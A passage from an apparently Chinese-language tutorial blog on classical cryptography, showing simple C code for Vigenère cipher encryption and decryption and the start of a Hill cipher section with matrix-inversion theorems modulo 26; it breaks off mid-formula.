<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Vig_E</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> m;</span><br><span class="line">    <span class="keyword">char</span> SecertKey[<span class="number">10</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;请输入密钥字长度和密钥字串：&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d %s&quot;</span>,&amp;m,&amp;SecertKey);</span><br><span class="line">    <span class="comment">//将密钥字串转化为数字串</span></span><br><span class="line">    <span class="keyword">int</span> NumberKey[<span class="number">10</span>];</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="built_in">strlen</span>(SecertKey);i++)</span><br><span class="line">        NumberKey[i]=SecertKey[i]-<span class="string">&#x27;A&#x27;</span>;</span><br><span class="line">    <span class="keyword">char</span> p[<span class="number">100</span>],c[<span class="number">100</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;请输入明文串：&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,&amp;p);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;密文串为：&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="built_in">strlen</span>(p);i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>((p[i]&gt;=<span class="string">&#x27;A&#x27;</span>)&amp;&amp;(p[i]&lt;=<span class="string">&#x27;Z&#x27;</span>))</span><br><span class="line">            c[i]=(p[i]-<span class="string">&#x27;A&#x27;</span>+NumberKey[i%m])%<span class="number">26</span>+<span class="string">&#x27;A&#x27;</span>;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>((p[i]&gt;=<span class="string">&#x27;a&#x27;</span>)&amp;&amp;(p[i]&lt;=<span class="string">&#x27;z&#x27;</span>))</span><br><span class="line">            c[i]=(p[i]-<span class="string">&#x27;a&#x27;</span>+NumberKey[i%m])%<span class="number">26</span>+<span class="string">&#x27;A&#x27;</span>;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,c[i]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>加密效果如下：</p>
<p><img src="https://gitee.com/Zhao-zhao2001/images/raw/master/img/20210418142907.png" alt="alt 维吉尼亚密码加密" /></p>
</li>
<li>
<p>解密代码实现：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Vig_D</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> m;</span><br><span class="line">    <span class="keyword">char</span> SecertKey[<span class="number">10</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;请输入密钥字长度和密钥字串：&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d %s&quot;</span>,&amp;m,&amp;SecertKey);</span><br><span class="line">    <span class="comment">//将密钥字串转化为数字串</span></span><br><span class="line">    <span class="keyword">int</span> NumberKey[<span class="number">10</span>];</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="built_in">strlen</span>(SecertKey);i++)</span><br><span class="line">        NumberKey[i]=SecertKey[i]-<span class="string">&#x27;A&#x27;</span>;</span><br><span class="line">    <span class="keyword">char</span> p[<span class="number">100</span>],c[<span class="number">100</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;请输入密文串：&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,&amp;c);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;明文串为：&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="built_in">strlen</span>(c);i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>((c[i]&gt;=<span class="string">&#x27;A&#x27;</span>)&amp;&amp;(c[i]&lt;=<span class="string">&#x27;Z&#x27;</span>))</span><br><span class="line">            p[i]=(c[i]-<span class="string">&#x27;A&#x27;</span>-NumberKey[i%m]+<span class="number">26</span>)%<span class="number">26</span>+<span class="string">&#x27;A&#x27;</span>;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>((c[i]&gt;=<span class="string">&#x27;a&#x27;</span>)&amp;&amp;(c[i]&lt;=<span class="string">&#x27;z&#x27;</span>))</span><br><span class="line">            p[i]=(c[i]-<span class="string">&#x27;a&#x27;</span>-NumberKey[i%m]+<span class="number">26</span>)%<span class="number">26</span>+<span class="string">&#x27;A&#x27;</span>;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,p[i]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>解密效果如下：</p>
<p><img src="https://gitee.com/Zhao-zhao2001/images/raw/master/img/20210418143203.png" alt="alt 维吉尼亚密码解密" /></p>
</li>
</ul>
<h2 id="希尔密码"><a class="markdownIt-Anchor" href="#希尔密码"></a> 希尔密码</h2>
<h3 id="介绍-5"><a class="markdownIt-Anchor" href="#介绍-5"></a> 介绍</h3>
<ul>
<li>希尔密码的思想是利用线性变换的方法，同以上的方法一样，运算都是在<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>Z</mi><mn>26</mn></msub></mrow><annotation encoding="application/x-tex">Z_{26}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07153em;">Z</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">6</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>上进行的。具体的其他介绍可自行查询。</li>
<li>引理1：矩阵<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>K</mi></mrow><annotation encoding="application/x-tex">K</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.07153em;">K</span></span></span></span>在模26情形下存在可逆矩阵的充分必要条件是<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>g</mi><mi>c</mi><mi>d</mi><mo stretchy="false">(</mo><mi>d</mi><mi>e</mi><mi>t</mi><mo stretchy="false">(</mo><mi>K</mi><mo stretchy="false">)</mo><mo separator="true">,</mo><mn>26</mn><mo stretchy="false">)</mo><mo>=</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">gcd(det(K),26)=1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="mord mathdefault">c</span><span class="mord mathdefault">d</span><span class="mopen">(</span><span class="mord mathdefault">d</span><span class="mord mathdefault">e</span><span class="mord mathdefault">t</span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.07153em;">K</span><span class="mclose">)</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">2</span><span class="mord">6</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span></span></span></span>。</li>
<li>定理1：设<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>K</mi><mo>=</mo><mo stretchy="false">(</mo><msub><mi>k</mi><mrow><mi>i</mi><mo separator="true">,</mo><mi>j</mi></mrow></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">K=(k_{i,j})</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.07153em;">K</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.036108em;vertical-align:-0.286108em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.311664em;"><span style="top:-2.5500000000000003em;margin-left:-0.03148em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">i</span><span class="mpunct mtight">,</span><span class="mord mathdefault mtight" style="margin-right:0.05724em;">j</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span>是一个定义在<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>Z</mi><mn>26</mn></msub></mrow><annotation encoding="application/x-tex">Z_{26}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07153em;">Z</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">6</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>上的<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>m</mi><mo>×</mo><mi>m</mi></mrow><annotation encoding="application/x-tex">m\times m</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord mathdefault">m</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">m</span></span></span></span>矩阵，若<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>K</mi></mrow><annotation encoding="application/x-tex">K</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.07153em;">K</span></span></span></span>在<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>Z</mi><mi>n</mi></msub></mrow><annotation encoding="application/x-tex">Z_n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07153em;">Z</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>上可逆，则有<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msup><mi>K</mi><mrow><mo>−</mo><mn>1</mn></mrow></msup><mo>=</mo><mo stretchy="false">(</mo><mi>d</mi><mi>e</mi><mi>t</mi><mtext> </mtext><mi>K</mi><msup><mo stretchy="false">)</mo><mrow><mo>−</mo><mn>1</mn></mrow></msup><msup><mi>K</mi><mo>∗</mo></msup></mrow><annotation encoding="application/x-tex">K^{-1}=(det\ K)^{-1}K^*</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8141079999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07153em;">K</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">−</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.064108em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathdefault">d</span><span class="mord mathdefault">e</span><span class="mord mathdefault">t</span><span class="mspace"> </span><span class="mord mathdefault" style="margin-right:0.07153em;">K</span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">−</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07153em;">K</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.688696em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mbin mtight">∗</span></span></span></span></span></span></span></span></span></span></span>，这里<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msup><mi>K</mi><mo>∗</mo></msup></mrow><annotation encoding="application/x-tex">K^*</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.688696em;vertical-align:0em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07153em;">K</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.688696em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mbin mtight">∗</span></span></span></span></span></span></span></span></span></span></span>为矩阵<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>K</mi></mrow><annotation encoding="application/x-tex">K</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.07153em;">K</span></span></span></span>的伴随矩阵。</li>
<li>推论1：对<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mn>2</mn><mo>×</mo><mn>2</mn></mrow><annotation encoding="application/x-tex">2\times 2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.72777em;vertical-align:-0.08333em;"></span><span class="mord">2</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">2</span></span></span></span>矩阵，设矩阵<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>K</mi><mo>=</mo><mrow><mo fence="true">[</mo><mtable rowspacing="0.15999999999999992em" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>k</mi><mrow><mn>1</mn><mo separator="true">,</mo><mn>1</mn></mrow></msub></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>k</mi><mrow><mn>1</mn><mo separator="true">,</mo><mn>2</mn></mrow></msub></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>k</mi><mrow><mn>2</mn><mo separator="true">,</mo><mn>1</mn></mrow></msub></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>k</mi><mrow><mn>2</mn><mo separator="true">,</mo><mn>2</mn></mrow></msub></mstyle></mtd></mtr></mtable><mo fence="true">]</mo></mrow></mrow><annotation encoding="application/x-tex">K=\left[\begin{matrix} k_{1,1} &amp; k_{1,2} \\ k_{2,1} &amp; k_{2,2}\end{matrix} \right]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.07153em;">K</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:2.40003em;vertical-align:-0.95003em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size3">[</span></span><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.45em;"><span style="top:-3.61em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathdefault" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.301108em;"><span style="top:-2.5500000000000003em;margin-left:-0.03148em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mpunct mtight">,</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span></span></span><span style="top:-2.4099999999999997em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathdefault" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.301108em;"><span style="top:-2.5500000000000003em;margin-left:-0.03148em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mpunct mtight">,</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.9500000000000004em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.45em;"><span style="top:-3.61em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathdefault" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.301108em;"><span style="top:-2.5500000000000003em;margin-left:-0.03148em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mpunct mtight">,</span><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span></span></span><span style="top:-2.4099999999999997em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathdefault" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.301108em;"><span style="top:-2.5500000000000003em;margin-left:-0.03148em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mpunct mtight">,</span><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.9500000000000004em;"><span></span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;"><span class="delimsizing size3">]</span></span></span></span></span></span>是一个定义在<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>Z</mi><mi>n</mi></msub></mrow><annotation encoding="application/x-tex">Z_n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07153em;">Z</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>上的矩阵。<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>d</mi><mi>e</mi><mi>t</mi><mtext> </mtext><mi>K</mi><mo>=</mo><msub><mi>k</mi><mrow><mn>1</mn><mo separator="true">,</mo><mn>1</mn></mrow></msub><msub><mi>k</mi><mrow><mn>2</mn><mo separator="true">,</mo><mn>2</mn></mrow></msub><mo>−</mo><msub><mi>k</mi><mrow><mn>1</mn><mo separator="true">,</mo><mn>2</mn></mrow></msub><msub><mi>k</mi><mrow><mn>2</mn><mo separator="true">,</mo><mn>1</mn></mrow></msub></mrow><annotation encoding="application/x-tex">det\ K=k_{1,1}k_{2,2}-k_{1,2}k_{2,1}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault">d</span><span class="mord mathdefault">e</span><span class="mord mathdefault">t</span><span class="mspace"> </span><span class="mord mathdefault" style="margin-right:0.07153em;">K</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.980548em;vertical-align:-0.286108em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.301108em;"><span style="top:-2.5500000000000003em;margin-left:-0.03148em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mpunct mtight">,</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.301108em;"><span style="top:-2.5500000000000003em;margin-left:-0.03148em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mpunct mtight">,</span><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.980548em;vertical-align:-0.286108em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.301108em;"><span style="top:-2.5500000000000003em;margin-left:-0.03148em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mpunct mtight">,</span><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.301108em;"><span style="top:-2.5500000000000003em;margin-left:-0.03148em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mpunct mtight">,</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span></span></span></span>是可逆的，则有：<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msup><mi>K</mi><mrow><mo>−</mo><mn>1</mn></mrow></msup><mo>=</mo><mo stretchy="false">(</mo><mi>d</mi><mi>e</mi><mi>t</mi><mtext> </mtext><mi>K</mi><msup><mo stretchy="false">)</mo><mrow><mo>−</mo><mn>1</mn></mrow></msup><mrow><mo fence="true">[</mo><mtable rowspacing="0.15999999999999992em" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>k</mi><mrow><mn>2</mn><mo separator="true">,</mo><mn>2</mn></mrow></msub></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mo>−</mo><msub><mi>k</mi><mrow><mn>1</mn><mo separator="true">,</mo><mn>2</mn></mrow></msub></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mo>−</mo><msub><mi>k</mi><mrow><mn>2</mn><mo separator="true">,</mo><mn>1</mn></mrow></msub></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>k</mi><mrow><mn>1</mn><mo separator="true">,</mo><mn>1</mn></mrow></msub></mstyle></mtd></mtr></mtable><mo fence="true">]</mo></mrow></mrow><annotation encoding="application/x-tex">K^{-1}=(det\ K)^{-1}\left[\begin{matrix}k_{2,2} &amp; -k_{1,2}\\ -k_{2,1} &amp; k_{1,1} \end{matrix} \right]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8141079999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07153em;">K</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">−</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:2.40003em;vertical-align:-0.95003em;"></span><span class="mopen">(</span><span class="mord mathdefault">d</span><span class="mord mathdefault">e</span><span class="mord mathdefault">t</span><span class="mspace"> </span><span class="mord mathdefault" style="margin-right:0.07153em;">K</span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">−</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size3">[</span></span><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.45em;"><span style="top:-3.61em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathdefault" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.301108em;"><span style="top:-2.5500000000000003em;margin-left:-0.03148em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mpunct mtight">,</span><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span></span></span><span style="top:-2.4099999999999997em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">−</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.301108em;"><span style="top:-2.5500000000000003em;margin-left:-0.03148em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mpunct mtight">,</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span 